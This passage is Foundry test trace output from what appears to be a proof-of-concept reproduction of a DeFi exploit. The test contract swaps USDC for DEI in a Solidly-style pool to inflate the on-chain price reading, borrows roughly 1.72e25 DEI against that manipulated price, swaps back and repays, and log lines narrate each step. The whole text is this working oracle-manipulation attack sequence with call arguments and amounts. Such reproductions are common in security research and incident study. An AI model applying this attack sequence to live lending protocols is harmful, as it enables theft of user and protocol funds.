    │   └─ ← [Return] 148034505000000 [1.48e14]
    ├─ emit log_named_uint(key: "The USDC I have now", val: 148034505000000 [1.48e14])
    ├─ [2639] 0x04068DA6C83AFCFA0e13ba15A6696662335D5B75::approve(0xa38cd27185a464914D3046f0AB9d43356B34829D, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0xa38cd27185a464914D3046f0AB9d43356B34829D, value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   └─ ← [Return] true
    ├─ [69540] 0xa38cd27185a464914D3046f0AB9d43356B34829D::swapExactTokensForTokensSimple(143200000000000 [1.432e14], 0, 0x04068DA6C83AFCFA0e13ba15A6696662335D5B75, 0xDE12c7959E1a72bbe8a5f7A1dc8f8EeF9Ab011B3, true, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1651088106 [1.651e9])
    │   ├─ [2597] 0x3fAaB499b519fdC5819e3D7ed0C26111904cbc28::isPair(0x5821573d8F04947952e76d94f3ABC6d7b43bF8d0) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   ├─ [15363] 0x5821573d8F04947952e76d94f3ABC6d7b43bF8d0::getAmountOut(143200000000000 [1.432e14], 0x04068DA6C83AFCFA0e13ba15A6696662335D5B75) [staticcall]
    │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000007cbe5bc41f671d39ee657
    │   ├─ [3789] 0x04068DA6C83AFCFA0e13ba15A6696662335D5B75::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x5821573d8F04947952e76d94f3ABC6d7b43bF8d0, 143200000000000 [1.432e14])
    │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x5821573d8F04947952e76d94f3ABC6d7b43bF8d0, value: 143200000000000 [1.432e14])
    │   │   └─ ← [Return] true
    │   ├─ [38442] 0x5821573d8F04947952e76d94f3ABC6d7b43bF8d0::swap(0, 9425359003112343047431767 [9.425e24], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
    │   │   ├─ [2332] 0x3fAaB499b519fdC5819e3D7ed0C26111904cbc28::isPaused() [staticcall]
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   ├─ [3514] 0xDE12c7959E1a72bbe8a5f7A1dc8f8EeF9Ab011B3::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 9425359003112343047431767 [9.425e24])
    │   │   │   ├─ emit Transfer(from: 0x5821573d8F04947952e76d94f3ABC6d7b43bF8d0, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 9425359003112343047431767 [9.425e24])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [597] 0x04068DA6C83AFCFA0e13ba15A6696662335D5B75::balanceOf(0x5821573d8F04947952e76d94f3ABC6d7b43bF8d0) [staticcall]
    │   │   │   └─ ← [Return] 153421976726736 [1.534e14]
    │   │   ├─ [649] 0xDE12c7959E1a72bbe8a5f7A1dc8f8EeF9Ab011B3::balanceOf(0x5821573d8F04947952e76d94f3ABC6d7b43bF8d0) [staticcall]
    │   │   │   └─ ← [Return] 5164627612615280369527 [5.164e21]
    │   │   ├─ [8023] 0x04068DA6C83AFCFA0e13ba15A6696662335D5B75::transfer(0x066DEd9F7FB9D15b4DE58DB8f38926Db994Dc252, 14320000000 [1.432e10])
    │   │   │   ├─ emit Transfer(from: 0x5821573d8F04947952e76d94f3ABC6d7b43bF8d0, to: 0x066DEd9F7FB9D15b4DE58DB8f38926Db994Dc252, value: 14320000000 [1.432e10])
    │   │   │   └─ ← [Return] true
    │   │   ├─ emit Fees(param0: 0xa38cd27185a464914D3046f0AB9d43356B34829D, param1: 14320000000 [1.432e10], param2: 0)
    │   │   ├─ [597] 0x04068DA6C83AFCFA0e13ba15A6696662335D5B75::balanceOf(0x5821573d8F04947952e76d94f3ABC6d7b43bF8d0) [staticcall]
    │   │   │   └─ ← [Return] 153407656726736 [1.534e14]
    │   │   ├─ [649] 0xDE12c7959E1a72bbe8a5f7A1dc8f8EeF9Ab011B3::balanceOf(0x5821573d8F04947952e76d94f3ABC6d7b43bF8d0) [staticcall]
    │   │   │   └─ ← [Return] 5164627612615280369527 [5.164e21]
    │   │   ├─ emit Sync(: 153407656726736 [1.534e14], : 5164627612615280369527 [5.164e21])
    │   │   ├─ emit Swap(sender: 0xa38cd27185a464914D3046f0AB9d43356B34829D, amount0In: 143200000000000 [1.432e14], amount1In: 0, amount0Out: 0, amount1Out: 9425359003112343047431767 [9.425e24], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   └─ ← [Stop] 
    │   └─ ← [Return] [143200000000000 [1.432e14], 9425359003112343047431767 [9.425e24]]
    ├─ [649] 0xDE12c7959E1a72bbe8a5f7A1dc8f8EeF9Ab011B3::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 9534619016488036874016888 [9.534e24]
    ├─ emit log_named_uint(key: "The DEI I have after swapping", val: 9534619016488036874016888 [9.534e24])
    ├─ [23544] 0x8129026c585bCfA530445a6267f9389057761A00::getOnChainPrice() [staticcall]
    │   ├─ [363] 0x5821573d8F04947952e76d94f3ABC6d7b43bF8d0::totalSupply() [staticcall]
    │   │   └─ ← [Return] 9821809243188676739 [9.821e18]
    │   ├─ [597] 0x04068DA6C83AFCFA0e13ba15A6696662335D5B75::balanceOf(0x5821573d8F04947952e76d94f3ABC6d7b43bF8d0) [staticcall]
    │   │   └─ ← [Return] 153407656726736 [1.534e14]
    │   ├─ [12934] 0x5821573d8F04947952e76d94f3ABC6d7b43bF8d0::getAmountOut(1000000000000000000 [1e18], 0xDE12c7959E1a72bbe8a5f7A1dc8f8EeF9Ab011B3) [staticcall]
    │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000024e05596f
    │   ├─ [649] 0xDE12c7959E1a72bbe8a5f7A1dc8f8EeF9Ab011B3::balanceOf(0x5821573d8F04947952e76d94f3ABC6d7b43bF8d0) [staticcall]
    │   │   └─ ← [Return] 5164627612615280369527 [5.164e21]
    │   └─ ← [Return] 20824251961275304317088252 [2.082e25]
    ├─ emit log_named_uint(key: "The price from Oracle", val: 20824251961275304317088252 [2.082e25])
    ├─ [0] VM::warp(1651113560 [1.651e9])
    │   └─ ← [Return] 
    ├─ emit log_named_uint(key: "the time now", val: 1651113560 [1.651e9])
    ├─ [125914] 0x8D643d954798392403eeA19dB8108f595bB8B730::borrow(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 17246885701212305622476302 [1.724e25], 20923953265992870251804289 [2.092e25], 1651113560 [1.651e9], 0x3078303137303132323031383361386539376233396562653363333862363136366364376339646466653363333866643736333532653536353262396332353436376161343762303430, [SchnorrSign({ signature: 1835036472718200664753898924933875196349373787186253604571797551094739683650 [1.835e75], owner: 0xF096EC73cB49B024f1D93eFe893E38337E7a099a, nonce: 0xD58D8931b98942EE19C431B72f4Bc8B3eD28d8DF })])
    │   ├─ emit UpdateAccrue(: 373449280981866509039 [3.734e20])
    │   ├─ [49039] 0x8129026c585bCfA530445a6267f9389057761A00::getPrice(20923953265992870251804289 [2.092e25], 1651113560 [1.651e9], 0x3078303137303132323031383361386539376233396562653363333862363136366364376339646466653363333866643736333532653536353262396332353436376161343762303430, [(1835036472718200664753898924933875196349373787186253604571797551094739683650 [1.835e75], 0xF096EC73cB49B024f1D93eFe893E38337E7a099a, 0xD58D8931b98942EE19C431B72f4Bc8B3eD28d8DF)])
    │   │   ├─ [363] 0x5821573d8F04947952e76d94f3ABC6d7b43bF8d0::totalSupply() [staticcall]
    │   │   │   └─ ← [Return] 9821809243188676739 [9.821e18]
    │   │   ├─ [597] 0x04068DA6C83AFCFA0e13ba15A6696662335D5B75::balanceOf(0x5821573d8F04947952e76d94f3ABC6d7b43bF8d0) [staticcall]
    │   │   │   └─ ← [Return] 153407656726736 [1.534e14]
    │   │   ├─ [12934] 0x5821573d8F04947952e76d94f3ABC6d7b43bF8d0::getAmountOut(1000000000000000000 [1e18], 0xDE12c7959E1a72bbe8a5f7A1dc8f8EeF9Ab011B3) [staticcall]
    │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000024e05596f
    │   │   ├─ [649] 0xDE12c7959E1a72bbe8a5f7A1dc8f8EeF9Ab011B3::balanceOf(0x5821573d8F04947952e76d94f3ABC6d7b43bF8d0) [staticcall]
    │   │   │   └─ ← [Return] 5164627612615280369527 [5.164e21]
    │   │   ├─ [19586] 0xE4F8d9A30936a6F8b17a73dC6fEb51a3BBABD51A::verify(0x3078303137303132323031383361386539376233396562653363333862363136366364376339646466653363333866643736333532653536353262396332353436376161343762303430, 66402877691101954972917673305743884264309628991555060668812889279635985179410 [6.64e76], [(1835036472718200664753898924933875196349373787186253604571797551094739683650 [1.835e75], 0xF096EC73cB49B024f1D93eFe893E38337E7a099a, 0xD58D8931b98942EE19C431B72f4Bc8B3eD28d8DF)])
    │   │   │   ├─ [4568] 0x43A544DD24Cb10975B7dE1dEEC49E77F652Dac66::verifySignature(6640200982781161673493485153898256430826487480649069966515439425968820272013 [6.64e75], 1, 1835036472718200664753898924933875196349373787186253604571797551094739683650 [1.835e75], 66402877691101954972917673305743884264309628991555060668812889279635985179410 [6.64e76], 0xD58D8931b98942EE19C431B72f4Bc8B3eD28d8DF) [staticcall]
    │   │   │   │   ├─ [3000] PRECOMPILES::ecrecover(0x0b9a5a1d7703783ffe01396d8f6ab23b0096ccfed3b30454f82e5e65cac828b6, 28, 6640200982781161673493485153898256430826487480649069966515439425968820272013, 83169320681626637710435490131074339108876712761754140031998135188442136388754) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000d58d8931b98942ee19c431b72f4bc8b3ed28d8df
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   ├─ emit Transaction(: 0x3078303137303132323031383361386539376233396562653363333862363136366364376339646466653363333866643736333532653536353262396332353436376161343762303430, : [0xF096EC73cB49B024f1D93eFe893E38337E7a099a])
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000114ed1c786acdf92493681
    │   ├─ [15570] 0x1B7879F4dB7980E464d6B92FDbf9DaA8F1E55073::mint(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 17246885701212305622476302 [1.724e25])
    │   │   ├─ [5223] 0xDE12c7959E1a72bbe8a5f7A1dc8f8EeF9Ab011B3::pool_mint(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 17246885701212305622476302 [1.724e25])
    │   │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 17246885701212305622476302 [1.724e25])
    │   │   │   ├─ emit DEIMinted(param0: 0x1B7879F4dB7980E464d6B92FDbf9DaA8F1E55073, param1: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param2: 17246885701212305622476302 [1.724e25])
    │   │   │   └─ ← [Stop] 
    │   │   └─ ← [Stop] 
    │   ├─ emit Borrow(: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], : ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], : 17419354558224428678701065 [1.741e25], : 17380404370959013703173068 [1.738e25])
    │   └─ ← [Return] 17380404370959013703173068 [1.738e25]
    ├─ [649] 0xDE12c7959E1a72bbe8a5f7A1dc8f8EeF9Ab011B3::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 26781504717700342496493190 [2.678e25]
    ├─ emit log_named_uint(key: "The DEI after borrowing", val: 26781504717700342496493190 [2.678e25])
    ├─ [158247] 0xa38cd27185a464914D3046f0AB9d43356B34829D::swapExactTokensForTokensSimple(12000000000000000000000000 [1.2e25], 0, 0xDE12c7959E1a72bbe8a5f7A1dc8f8EeF9Ab011B3, 0x04068DA6C83AFCFA0e13ba15A6696662335D5B75, true, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1651113560 [1.651e9])
    │   ├─ [597] 0x3fAaB499b519fdC5819e3D7ed0C26111904cbc28::isPair(0x5821573d8F04947952e76d94f3ABC6d7b43bF8d0) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   ├─ [35074] 0x5821573d8F04947952e76d94f3ABC6d7b43bF8d0::getAmountOut(12000000000000000000000000 [1.2e25], 0xDE12c7959E1a72bbe8a5f7A1dc8f8EeF9Ab011B3) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000848e771eee09
    │   ├─ [6248] 0xDE12c7959E1a72bbe8a5f7A1dc8f8EeF9Ab011B3::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x5821573d8F04947952e76d94f3ABC6d7b43bF8d0, 12000000000000000000000000 [1.2e25])
    │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x5821573d8F04947952e76d94f3ABC6d7b43bF8d0, value: 12000000000000000000000000 [1.2e25])
    │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0xa38cd27185a464914D3046f0AB9d43356B34829D, value: 115792089237316195423570985008687907853269984665640551148717597383606956225056 [1.157e77])
    │   │   └─ ← [Return] true
    │   ├─ [106929] 0x5821573d8F04947952e76d94f3ABC6d7b43bF8d0::swap(145747418738185 [1.457e14], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
    │   │   ├─ [332] 0x3fAaB499b519fdC5819e3D7ed0C26111904cbc28::isPaused() [staticcall]
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   ├─ [3223] 0x04068DA6C83AFCFA0e13ba15A6696662335D5B75::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 145747418738185 [1.457e14])
    │   │   │   ├─ emit Transfer(from: 0x5821573d8F04947952e76d94f3ABC6d7b43bF8d0, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 145747418738185 [1.457e14])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [597] 0x04068DA6C83AFCFA0e13ba15A6696662335D5B75::balanceOf(0x5821573d8F04947952e76d94f3ABC6d7b43bF8d0) [staticcall]
    │   │   │   └─ ← [Return] 7660237988551 [7.66e12]
    │   │   ├─ [649] 0xDE12c7959E1a72bbe8a5f7A1dc8f8EeF9Ab011B3::balanceOf(0x5821573d8F04947952e76d94f3ABC6d7b43bF8d0) [staticcall]
    │   │   │   └─ ← [Return] 12005164627612615280369527 [1.2e25]
    │   │   ├─ [8314] 0xDE12c7959E1a72bbe8a5f7A1dc8f8EeF9Ab011B3::transfer(0x066DEd9F7FB9D15b4DE58DB8f38926Db994Dc252, 1200000000000000000000 [1.2e21])
    │   │   │   ├─ emit Transfer(from: 0x5821573d8F04947952e76d94f3ABC6d7b43bF8d0, to: 0x066DEd9F7FB9D15b4DE58DB8f38926Db994Dc252, value: 1200000000000000000000 [1.2e21])
    │   │   │   └─ ← [Return] true
    │   │   ├─ emit Fees(param0: 0xa38cd27185a464914D3046f0AB9d43356B34829D, param1: 0, param2: 1200000000000000000000 [1.2e21])
    │   │   ├─ [597] 0x04068DA6C83AFCFA0e13ba15A6696662335D5B75::balanceOf(0x5821573d8F04947952e76d94f3ABC6d7b43bF8d0) [staticcall]
    │   │   │   └─ ← [Return] 7660237988551 [7.66e12]
    │   │   ├─ [649] 0xDE12c7959E1a72bbe8a5f7A1dc8f8EeF9Ab011B3::balanceOf(0x5821573d8F04947952e76d94f3ABC6d7b43bF8d0) [staticcall]
    │   │   │   └─ ← [Return] 12003964627612615280369527 [1.2e25]
    │   │   ├─ emit Sync(: 7660237988551 [7.66e12], : 12003964627612615280369527 [1.2e25])
    │   │   ├─ emit Swap(sender: 0xa38cd27185a464914D3046f0AB9d43356B34829D, amount0In: 0, amount1In: 12000000000000000000000000 [1.2e25], amount0Out: 145747418738185 [1.457e14], amount1Out: 0, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   └─ ← [Stop] 
    │   └─ ← [Return] [12000000000000000000000000 [1.2e25], 145747418738185 [1.457e14]]
    ├─ [25123] 0x04068DA6C83AFCFA0e13ba15A6696662335D5B75::transfer(0xC564EE9f21Ed8A2d8E7e76c085740d5e4c5FaFbE, 150000000000000 [1.5e14])
    │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0xC564EE9f21Ed8A2d8E7e76c085740d5e4c5FaFbE, value: 150000000000000 [1.5e14])
    │   └─ ← [Return] true
    ├─ [649] 0xDE12c7959E1a72bbe8a5f7A1dc8f8EeF9Ab011B3::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 14781504717700342496493190 [1.478e25]
    ├─ [597] 0x04068DA6C83AFCFA0e13ba15A6696662335D5B75::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 581923738185 [5.819e11]
    ├─ emit log_named_uint(key: "The USDC after paying back", val: 581923738185 [5.819e11])
    ├─ emit log_named_uint(key: "The DEI after paying back", val: 14781504717700342496493190 [1.478e25])
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 399.24ms (10.90ms CPU time)

Ran 2 test suites in 694.30ms (783.31ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
